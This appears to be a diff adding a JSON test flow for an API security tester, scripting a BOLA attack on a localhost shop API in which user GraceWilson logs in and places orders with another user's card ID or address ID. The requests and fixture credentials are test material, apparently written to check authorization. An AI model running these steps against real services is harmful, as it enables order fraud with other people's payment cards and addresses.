@@ -1,0 +1,51 @@
+{
+    "id": "flow_bola_attacker_uses_victim_card_or_address_for_own_order",
+    "name": "BOLA: Attacker Uses Victim's Card/Address for Own Order",
+    "description": "Attacker (GraceWilson) places orders for herself, but uses victim's (HenryMoore) credit card ID or address ID in query parameters.",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "attackerUserId": "00000008-0000-0000-0000-000000000008",
+      "attackerUsername": "GraceWilson",
+      "attackerPassword": "GracePass7&",
+      "attackerAddressId": "ad000008-0001-0000-0000-000000000001",
+      "attackerCardId": "cc000008-0001-0000-0000-000000000001",
+      "victimAddressId": "ad000009-0001-0000-0000-000000000001",
+      "victimCardId": "cc000009-0001-0000-0000-000000000001",
+      "sampleProductId": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "steps": [
+      {
+        "id": "step_attacker_login_grace_own_order_exploit",
+        "name": "Attacker (GraceWilson) Logs In",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "attacker_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_attacker_order_own_address_victim_card",
+        "name": "Attacker Order (Own Address, Victim's Card)",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders?address_id={{attackerAddressId}}&credit_card_id={{victimCardId}}&product_id_1={{sampleProductId}}&quantity_1=1",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_order_victim_address_own_card",
+        "name": "Attacker Order (Victim's Address, Own Card)",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders?address_id={{victimAddressId}}&credit_card_id={{attackerCardId}}&product_id_1={{sampleProductId}}&quantity_1=2",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      }
+    ]
+  }
